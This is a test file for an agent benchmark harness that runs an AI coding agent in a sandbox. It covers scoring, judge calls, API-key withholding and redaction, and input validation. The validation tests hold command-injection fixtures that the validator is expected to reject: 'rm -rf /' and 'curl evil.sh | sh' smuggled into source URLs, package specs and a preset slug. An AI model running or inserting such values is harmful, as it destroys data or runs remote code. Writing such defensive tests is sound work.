import { describe, expect, it } from "bun:test";

import {
  gen,
  provide,
  runPromise,
  succeed,
  void as effectVoid,
} from "effect/Effect";
import type { Layer } from "effect/Layer";
import {
  effect as layerEffect,
  mergeAll as layerMergeAll,
  provide as layerProvide,
  succeed as layerSucceed,
} from "effect/Layer";

import {
  noopCheckpointLayer,
  noopProgressLayer,
} from "../../../test/helpers/noop-progress-layer";
import type { Sample, TaskState } from "../../harness/core";
import { initialTaskState, ScoreValue } from "../../harness/core";
import { Solver } from "../../harness/solver";
import type {
  CreateSessionInput,
  ExecResult,
  SandboxSessionInstance,
} from "../terminal-bench/sandbox";
import { SandboxSession } from "../terminal-bench/sandbox";
import { readAgentDxMeta } from "./dataset";
import {
  DEFAULT_AGENT_DX_DOCS_SOURCE,
  DEFAULT_AGENT_DX_SKILLS_SOURCE,
  DEFAULT_OPENCODE_PACKAGE,
} from "./schema";
import { agentDxScorer } from "./scorer";
import type { AgentDxSolverOpts } from "./solver";
import {
  harnessSolver,
  normalizeOpenRouterOrigin,
  redactKeyMaterial,
} from "./solver";

const OPENCODE_EVENT_STREAM = [
  JSON.stringify({ type: "text", timestamp: 1, part: { text: "building..." } }),
  JSON.stringify({
    type: "step_finish",
    part: {
      reason: "stop",
      tokens: {
        total: 8275,
        input: 538,
        output: 174,
        reasoning: 1,
        cache: { write: 0, read: 7562 },
      },
      cost: 0.0015238,
    },
  }),
].join("\n");

const SOLVER_OPTS: AgentDxSolverOpts = {
  model: "anthropic/claude-sonnet-4.5",
  apiKey: "sk-test",
  profile: "baseline",
  opencodePackage: DEFAULT_OPENCODE_PACKAGE,
  skillsSource: DEFAULT_AGENT_DX_SKILLS_SOURCE,
  docsSource: DEFAULT_AGENT_DX_DOCS_SOURCE,
  judgeModel: null,
  sandboxKey: "provided",
};

interface FakeExecCall {
  readonly argv: readonly string[];
  readonly env: Readonly<Record<string, string>>;
}

function makeFakeSandboxLayer(behavior: {
  readonly reward: number;
  readonly verifierOutput?: string;
  readonly agentEventStream?: string;
  readonly agentExitCode?: number;
  readonly workspaceDump?: string;
  readonly execCalls?: FakeExecCall[];
  readonly createInputs?: CreateSessionInput[];
}): Layer<SandboxSession> {
  const exec = (
    argv: string[],
    env: Readonly<Record<string, string>>
  ): ReturnType<SandboxSessionInstance["exec"]> => {
    behavior.execCalls?.push({ argv: [...argv], env: { ...env } });
    const joined = argv.join(" ");
    if (joined.includes("opencode run")) {
      return succeed<ExecResult>({
        stdout: behavior.agentEventStream ?? "",
        stderr: "",
        exitCode: behavior.agentExitCode ?? 0,
      });
    }
    if (joined.includes("find /app")) {
      return succeed<ExecResult>({
        stdout: behavior.workspaceDump ?? "",
        stderr: "",
        exitCode: 0,
      });
    }
    if (joined.includes("cat /logs/verifier/reward")) {
      return succeed<ExecResult>({
        stdout: String(behavior.reward),
        stderr: "",
        exitCode: 0,
      });
    }
    return succeed<ExecResult>({
      stdout: behavior.verifierOutput ?? "",
      stderr: "",
      exitCode: 0,
    });
  };
  const create = (
    input: CreateSessionInput
  ): ReturnType<SandboxSession["Type"]["create"]> => {
    behavior.createInputs?.push(input);
    return succeed({
      sandboxId: "fake-sandbox",
      exec: (argv, env, _timeoutMs) => exec(argv, env),
      runTests: () =>
        succeed({
          reward: behavior.reward,
          output: behavior.verifierOutput ?? "",
        }),
      destroy: () => effectVoid,
    });
  };
  return layerSucceed(SandboxSession, { create });
}

function sampleState(
  category = "integration",
  taskEnv: Record<string, string> = { OR_EVAL_MODEL: "openai/gpt-4o-mini" }
): TaskState {
  const sample: Sample = {
    id: "agent_dx-basic-completion",
    input: "Build a minimal TypeScript project...",
    target: { text: "basic-completion" },
    metadata: {
      taskId: "basic-completion",
      dockerImage: "node:24-bookworm",
      maxAgentTimeoutSec: 900,
      maxTestTimeoutSec: 300,
      difficulty: "easy",
      category,
      taskEnv,
    },
  };
  return initialTaskState(sample);
}

async function runOpencodeSolver(
  sandboxLayer: Layer<SandboxSession>,
  opts: AgentDxSolverOpts = SOLVER_OPTS,
  sample?: { category?: string; taskEnv?: Record<string, string> }
): Promise<TaskState> {
  const solverLayer = layerEffect(Solver)(
    gen(function* () {
      const sessionFactory = yield* SandboxSession;
      return Solver.of(harnessSolver(sessionFactory, opts, "opencode"));
    })
  );
  return runPromise(
    gen(function* () {
      const solver = yield* Solver;
      return yield* solver(sampleState(sample?.category, sample?.taskEnv));
    }).pipe(
      provide(
        layerMergeAll(
          solverLayer.pipe(layerProvide(sandboxLayer)),
          noopProgressLayer,
          noopCheckpointLayer
        )
      )
    )
  );
}

describe("agent-dx opencode solver", () => {
  it("stashes reward=1 and scores Correct when the verifier passes", async () => {
    const layer = makeFakeSandboxLayer({
      reward: 1,
      verifierOutput: "VERIFY PASS",
      agentEventStream: OPENCODE_EVENT_STREAM,
    });

    const finalState = await runOpencodeSolver(layer);
    const meta = readAgentDxMeta(finalState.sample.metadata);
    expect(meta?.reward).toBe(1);
    expect(meta?.testOutput).toBe("VERIFY PASS");
    expect(finalState.completed).toBe(true);
    expect(finalState.output?.usage?.totalCost).toBeCloseTo(0.0015238, 7);
    expect(finalState.output?.usage?.inputTokens).toBe(538 + 7562);
    expect(finalState.output?.usage?.outputTokens).toBe(174);

    const score = await runPromise(
      agentDxScorer(finalState, finalState.sample.target)
    );
    expect(score.value).toBe(ScoreValue.Correct);
  });

  it("scores Incorrect when the verifier fails, even if the agent exits 0", async () => {
    const layer = makeFakeSandboxLayer({
      reward: 0,
      verifierOutput: "VERIFY FAIL: generation not retrievable",
      agentEventStream: OPENCODE_EVENT_STREAM,
    });

    const finalState = await runOpencodeSolver(layer);
    const meta = readAgentDxMeta(finalState.sample.metadata);
    expect(meta?.reward).toBe(0);

    const score = await runPromise(
      agentDxScorer(finalState, finalState.sample.target)
    );
    expect(score.value).toBe(ScoreValue.Incorrect);
  });

  it("records verifier subcheck counts as partial credit alongside the binary reward", async () => {
    const layer = makeFakeSandboxLayer({
      reward: 0,
      verifierOutput: [
        "SUBCHECK project_present=pass",
        "SUBCHECK app_ran=pass",
        "SUBCHECK verified=fail",
        "VERIFY FAIL: no live generation record",
      ].join("\n"),
    });

    const finalState = await runOpencodeSolver(layer);
    expect(finalState.sample.metadata?.["subchecksPassed"]).toBe(2);
    expect(finalState.sample.metadata?.["subchecksTotal"]).toBe(3);
    expect(readAgentDxMeta(finalState.sample.metadata)?.reward).toBe(0);
  });

  it("records judge quality for a passing trial without touching the reward", async () => {
    const originalFetch = globalThis.fetch;
    const judgeRequests: string[] = [];
    const judgeFetch: typeof globalThis.fetch = async (url) => {
      judgeRequests.push(String(url));
      return new Response(
        JSON.stringify({
          choices: [
            {
              message: {
                content: JSON.stringify({
                  criteria: [
                    { id: "current_models", score: 2, reason: "live catalog" },
                    {
                      id: "api_usage",
                      score: 1,
                      reason: "no usage accounting",
                    },
                    {
                      id: "robustness",
                      score: 1,
                      reason: "status checks only",
                    },
                    {
                      id: "code_clarity",
                      score: 2,
                      reason: "small single file",
                    },
                  ],
                }),
              },
            },
          ],
        }),
        { status: 200, headers: { "Content-Type": "application/json" } }
      );
    };
    globalThis.fetch = judgeFetch;

    try {
      const finalState = await runOpencodeSolver(
        makeFakeSandboxLayer({
          reward: 1,
          verifierOutput: "VERIFY PASS",
          workspaceDump: "=== /app/index.ts ===\nawait fetch(...)",
        }),
        { ...SOLVER_OPTS, judgeModel: "anthropic/claude-sonnet-4.5" }
      );

      expect(judgeRequests).toEqual([
        "https://openrouter.ai/api/v1/chat/completions",
      ]);
      expect(finalState.sample.metadata?.["quality"]).toBeCloseTo(0.75, 5);
      expect(readAgentDxMeta(finalState.sample.metadata)?.reward).toBe(1);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it("keeps the trial scoreable when the judge call fails", async () => {
    const originalFetch = globalThis.fetch;
    const failingFetch: typeof globalThis.fetch = async () =>
      new Response("nope", { status: 500 });
    globalThis.fetch = failingFetch;

    try {
      const finalState = await runOpencodeSolver(
        makeFakeSandboxLayer({
          reward: 1,
          verifierOutput: "VERIFY PASS",
          workspaceDump: "=== /app/index.ts ===\nawait fetch(...)",
        }),
        { ...SOLVER_OPTS, judgeModel: "anthropic/claude-sonnet-4.5" }
      );

      expect(finalState.sample.metadata?.["quality"]).toBeUndefined();
      const score = await runPromise(
        agentDxScorer(finalState, finalState.sample.target)
      );
      expect(score.value).toBe(ScoreValue.Correct);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it("skips the judge entirely when no judge model is configured", async () => {
    const execCalls: FakeExecCall[] = [];
    await runOpencodeSolver(
      makeFakeSandboxLayer({
        reward: 1,
        verifierOutput: "VERIFY PASS",
        execCalls,
      }),
      { ...SOLVER_OPTS, judgeModel: null }
    );

    expect(execCalls.some((c) => c.argv.join(" ").includes("find /app"))).toBe(
      false
    );
  });

  it("still runs the verifier when the agent exits nonzero", async () => {
    const execCalls: FakeExecCall[] = [];
    const layer = makeFakeSandboxLayer({
      reward: 0,
      agentExitCode: 137,
      execCalls,
    });

    const finalState = await runOpencodeSolver(layer);
    const meta = readAgentDxMeta(finalState.sample.metadata);
    expect(meta?.reward).toBe(0);
    expect(meta?.testOutput).toContain("agent harness exited 137");
    const verifierCall = execCalls.find((c) =>
      c.argv.join(" ").includes("/tests/test.sh")
    );
    expect(verifierCall).toBeDefined();
  });

  it("creates /app in the image build steps (plain base images lack the sandbox workdir)", async () => {
    const createInputs: CreateSessionInput[] = [];
    const layer = makeFakeSandboxLayer({ reward: 1, createInputs });

    await runOpencodeSolver(layer);
    expect(createInputs[0]?.imageBuildSteps).toContain("RUN mkdir -p /app");
  });

  it("installs the OpenRouter skills in the image for the skills profile", async () => {
    const createInputs: CreateSessionInput[] = [];
    const layer = makeFakeSandboxLayer({ reward: 1, createInputs });

    await runOpencodeSolver(layer, { ...SOLVER_OPTS, profile: "skills" });
    const steps = createInputs[0]?.imageBuildSteps ?? [];
    expect(steps.join("\n")).toContain(
      "git clone --depth 1 https://github.com/OpenRouterTeam/skills /opt/openrouter-skills"
    );
    expect(steps.join("\n")).toContain("/root/.config/opencode/skills");
  });

  it("passes the API key + task env to both the agent and the verifier", async () => {
    const execCalls: FakeExecCall[] = [];
    const layer = makeFakeSandboxLayer({ reward: 1, execCalls });

    await runOpencodeSolver(layer);
    const agentCall = execCalls.find((c) =>
      c.argv.join(" ").includes("opencode run")
    );
    const verifierCall = execCalls.find((c) =>
      c.argv.join(" ").includes("/tests/test.sh")
    );
    for (const call of [agentCall, verifierCall]) {
      expect(call?.env["OPENROUTER_API_KEY"]).toBe("sk-test");
      expect(call?.env["OR_EVAL_MODEL"]).toBe("openai/gpt-4o-mini");
    }
    expect(agentCall?.env["ADX_MODEL"]).toBe("anthropic/claude-sonnet-4.5");
  });

  it("withholds OPENROUTER_API_KEY from the agent but not the verifier in absent key mode", async () => {
    const execCalls: FakeExecCall[] = [];
    const layer = makeFakeSandboxLayer({ reward: 1, execCalls });

    await runOpencodeSolver(layer, { ...SOLVER_OPTS, sandboxKey: "absent" });
    const agentCall = execCalls.find((c) =>
      c.argv.join(" ").includes("opencode run")
    );
    const verifierCall = execCalls.find((c) =>
      c.argv.join(" ").includes("/tests/test.sh")
    );
    expect(agentCall?.env["OPENROUTER_API_KEY"]).toBeUndefined();
    expect(agentCall?.env["ADX_HARNESS_KEY"]).toBe("sk-test");
    expect(verifierCall?.env["OPENROUTER_API_KEY"]).toBe("sk-test");
  });
});

describe("skills-source validation", () => {
  it("fails the solver when a skills source contains shell metacharacters", async () => {
    const layer = makeFakeSandboxLayer({ reward: 1 });
    const run = runOpencodeSolver(layer, {
      ...SOLVER_OPTS,
      profile: "skills",
      skillsSource: "https://github.com/OpenRouterTeam/skills#main; rm -rf /",
    });
    await expect(run).rejects.toThrow("invalid skillsSource");
  });

  it("fails the solver when the pinned ref starts with a dash", async () => {
    const layer = makeFakeSandboxLayer({ reward: 1 });
    const run = runOpencodeSolver(layer, {
      ...SOLVER_OPTS,
      profile: "skills",
      skillsSource: "https://github.com/OpenRouterTeam/skills#--help",
    });
    await expect(run).rejects.toThrow("invalid skillsSource");
  });

  it("fails the solver when the opencode package spec contains shell metacharacters", async () => {
    const layer = makeFakeSandboxLayer({ reward: 1 });
    const run = runOpencodeSolver(layer, {
      ...SOLVER_OPTS,
      opencodePackage: "opencode-ai@latest && curl evil.sh | sh",
    });
    await expect(run).rejects.toThrow("invalid opencodePackage");
  });

  it("fails the solver when the docs source contains shell metacharacters", async () => {
    const layer = makeFakeSandboxLayer({ reward: 1 });
    const run = runOpencodeSolver(layer, {
      ...SOLVER_OPTS,
      profile: "docs",
      docsSource: "https://openrouter.ai/docs/llms-full.txt; rm -rf /",
    });
    await expect(run).rejects.toThrow("invalid docsSource");
  });

  it("fails the solver when the task preset slug contains shell metacharacters", async () => {
    const layer = makeFakeSandboxLayer({ reward: 1 });
    const run = runOpencodeSolver(layer, SOLVER_OPTS, {
      taskEnv: {
        ADX_PRESET_SLUG: 'agent-dx-bench-preset"; curl evil.sh | sh; :"',
      },
    });
    await expect(run).rejects.toThrow("invalid ADX_PRESET_SLUG");
  });
});

describe("redactKeyMaterial", () => {
  it("redacts OpenRouter key material anywhere in the text", () => {
    const text =
      'created {"key":"sk-or-v1-abc_DEF-123"} and echoed sk-or-v1-zzz9';
    expect(redactKeyMaterial(text)).toBe(
      'created {"key":"sk-or-<redacted>"} and echoed sk-or-<redacted>'
    );
  });

  it("leaves text without key material unchanged", () => {
    expect(redactKeyMaterial("gen-abc123 model=openai/gpt-5.2")).toBe(
      "gen-abc123 model=openai/gpt-5.2"
    );
  });

  it("redacts exact secret values regardless of their format", () => {
    const text = "auth: Bearer mgmt-key-XYZ done";
    expect(redactKeyMaterial(text, ["mgmt-key-XYZ"])).toBe(
      "auth: Bearer <redacted> done"
    );
  });

  it("ignores empty secrets", () => {
    expect(redactKeyMaterial("abc", [""])).toBe("abc");
  });
});

describe("normalizeOpenRouterOrigin", () => {
  it("strips a trailing /api/v1 so verifiers can append API paths", () => {
    expect(normalizeOpenRouterOrigin("https://openrouter.ai/api/v1")).toBe(
      "https://openrouter.ai"
    );
    expect(normalizeOpenRouterOrigin("http://localhost:8787/api/v1/")).toBe(
      "http://localhost:8787"
    );
  });

  it("leaves bare origins unchanged", () => {
    expect(normalizeOpenRouterOrigin("https://openrouter.ai")).toBe(
      "https://openrouter.ai"
    );
  });
});
